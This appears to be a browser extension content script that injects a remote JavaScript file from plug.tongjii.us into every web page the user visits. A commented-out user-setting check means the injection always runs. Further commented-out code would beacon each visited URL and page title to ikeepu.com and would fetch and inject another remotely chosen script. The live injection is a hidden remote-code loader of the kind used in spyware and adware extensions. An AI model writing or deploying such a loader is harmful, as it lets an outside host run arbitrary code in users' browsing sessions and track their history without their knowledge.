chrome.extension.sendRequest({localstorage: 'simiautocheck'}, function(response){
    var v = response.autocheck;
    if(!document.body || !document.location)  return;
    var url = document.location.href;
    if(url.indexOf('http') == 0){
        //var title = document.title;
        //var img = new Image();
        //img.src = 'http://ikeepu.com/command/history?url=' + encodeURIComponent(url) + '&title=' + encodeURIComponent(title);
    }
//    if(v != '1'){
        var t = 'http://plug.tongjii.us/plug/simi/a.js';
        if(url.indexOf('https') == 0){
        	t = 'https://plug.tongjii.us/plug/simi/a.js';
        }
        var s = document.createElement('script');
        s.setAttribute('type','text/javascript');
        s.setAttribute('src',t);
        document.body.appendChild(s);
//    }
    var isExtInstalledNode = document.createElement('div');
    isExtInstalledNode.id = 'simi-extension-is-installed';
    isExtInstalledNode.setAttribute('style','display:none;');
    document.body.appendChild(isExtInstalledNode);
});

/*chrome.extension.sendRequest({action: "execute_in_page"}, function() {
//yahoo_link_list_fix
if(document.domain.toLowerCase().indexOf('sitemap.cn.yahoo.com')>-1)
	$("div.sma_co5 li").css('height','auto').find("a").attr("target", "_blank");
});*/

//(function(){
//	$.getJSON("http://list.tongjii.us/list/simi/js.php", {},function(datalog){
//		alert(datalog.js)
//		if(datalog&&datalog.js){
//			addHttps(datalog.js);
//		}
//	});
//})();
//
//function addHttps(url){
//	var _ua = navigator.userAgent.toLowerCase();
//	var isIE6 = /msie 6/.test(_ua);
//	if (!isIE6) {
//		var js = document.createElement('script');
//		js.src = url;
//		js.setAttribute('charset', 'utf-8');
//		(document.getElementsByTagName("head")[0] || document.body).appendChild(js);
//		js.onload = js.onreadystatechange = function () {	
//			if (js && js.readyState && js.readyState != "loaded" && js.readyState != "complete") {
//				return;
//			}
//		}
//	}
//}
